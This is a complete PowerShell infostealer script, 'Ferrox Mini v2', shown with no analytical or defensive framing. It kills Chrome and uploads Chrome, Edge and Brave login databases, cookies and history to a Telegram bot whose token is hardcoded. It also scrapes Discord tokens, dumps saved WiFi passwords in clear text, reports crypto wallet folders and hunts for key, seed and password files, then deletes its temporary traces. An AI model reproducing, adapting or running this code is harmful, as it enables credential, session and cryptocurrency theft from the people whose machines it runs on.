# Ferrox Mini v2 — Fixed (locked files + upload)
$BT="8875226322:AAFsOazAfQOy5rlP1LQSM2JPX0YiPXQZPSM"
$CI="8468737863"

function TG($t){
    try{
        $u="https://api.telegram.org/bot$BT/sendMessage"
        (New-Object Net.WebClient).UploadString($u,"chat_id=$CI&text=$([Uri]::EscapeDataString($t))")|Out-Null
    }catch{}
}

function SEND-FILE($path,$name){
    if(!(Test-Path $path)){return}
    $sz=(Get-Item $path).Length
    if($sz -eq 0){return}
    try{
        $u="https://api.telegram.org/bot$BT/sendDocument"
        $bd="fx$(Get-Random)"
        $N="`r`n"
        $B=[Text.Encoding]::UTF8
        $hdr="--$bd$N"+"Content-Disposition: form-data; name=`"chat_id`"$N$N$CI$N"+"--$bd$N"+"Content-Disposition: form-data; name=`"document`"; filename=`"$name`"$N"+"Content-Type: application/octet-stream$N$N"
        $ftr="$N--$bd--$N"
        $bh=$B.GetBytes($hdr);$bf=$B.GetBytes($ftr)
        $bb=[IO.File]::ReadAllBytes($path)
        $all=New-Object byte[]($bh.Length+$bb.Length+$bf.Length)
        [Buffer]::BlockCopy($bh,0,$all,0,$bh.Length)
        [Buffer]::BlockCopy($bb,0,$all,$bh.Length,$bb.Length)
        [Buffer]::BlockCopy($bf,0,$all,$bh.Length+$bb.Length,$bf.Length)
        $wc=New-Object Net.WebClient
        $wc.Headers.Add("Content-Type","multipart/form-data; boundary=$bd")
        [void]$wc.UploadData($u,$all)
    }catch{}
}

TG "FERROX: $env:COMPUTERNAME / $env:USERNAME"

# Kill Chrome to unlock DB files
Get-Process chrome -EA 0 | Stop-Process -Force -EA 0
Start-Sleep 1

# System info
try{$os=(Get-WmiObject Win32_OperatingSystem).Caption}catch{$os="?"}
try{$ram=[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)}catch{$ram="?"}
try{$ip=(Invoke-WebRequest "https://api.ipify.org" -UseBasicParsing -TimeoutSec 3).Content}catch{$ip="?"}
TG "OS: $os | RAM: ${ram}GB | IP: $ip"

# Chrome
$chromeBases=@("$env:LOCALAPPDATA\Google\Chrome\User Data","$env:LOCALAPPDATA\Microsoft\Edge\User Data","$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data")
foreach($base in $chromeBases){
    if(!(Test-Path $base)){continue}
    Get-ChildItem $base -Directory -EA 0 | %{
        $p=$_.FullName
        @("Login Data","Web Data","History","Bookmarks","Preferences","Cookies") | %{
            $f="$p\$_"
            if(Test-Path $f){
                $tmp="$env:TEMP\fx_$_$((Get-Date).Ticks).dat"
                try{Copy-Item $f $tmp -Force -EA Stop;SEND-FILE $tmp "$($_.Name)";Remove-Item $tmp -Force -EA 0}catch{}
            }
        }
    }
}
TG "CHROME: done"

# Discord tokens
$discordPaths=@("$env:APPDATA\discord\Local Storage\leveldb","$env:APPDATA\discordcanary\Local Storage\leveldb","$env:APPDATA\discordptb\Local Storage\leveldb")
foreach($dp in $discordPaths){
    if(!(Test-Path $dp)){continue}
    Get-ChildItem $dp -Filter "*.ldb" -EA 0 | %{
        $c=Get-Content $_.FullName -Raw -EA 0
        if($c -and $c -match '([a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27})'){
            TG "DISCORD: $($Matches[1])"
        }
    }
}

# WiFi
try{
    netsh wlan show profiles 2>&1 | Select-String ":\s+" | %{
        $p=$_ -replace '.*:\s+',''
        $d=netsh wlan show profile name="$p" key=clear 2>&1
        $k=$d | Select-String "Key Content" | %{$_ -replace '.*:\s+',''}
        TG "WIFI: $p = $k"
    }
}catch{}

# Wallets
$wallets=@("$env:APPDATA\Exodus","$env:APPDATA\atomic","$env:APPDATA\Electrum\wallets","$env:APPDATA\Ledger Live","$env:APPDATA\phantom","$env:LOCALAPPDATA\Ronin","$env:APPDATA\Binance","$env:APPDATA\Armory")
foreach($w in $wallets){if(Test-Path $w){TG "WALLET: $w"}}

# Fichiers sensibles
Get-ChildItem "$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents" -Recurse -Include "*.kdbx","*.seed","*.wallet","*.pem","*.key","*password*","*secret*","*backup*" -EA 0 -Depth 3 | %{
    TG "FILE: $($_.FullName)"
}

# Nettoyage
Get-ChildItem $env:TEMP -Filter "fx_*" -EA 0 | Remove-Item -Force -EA 0
TG "FERROX DONE"
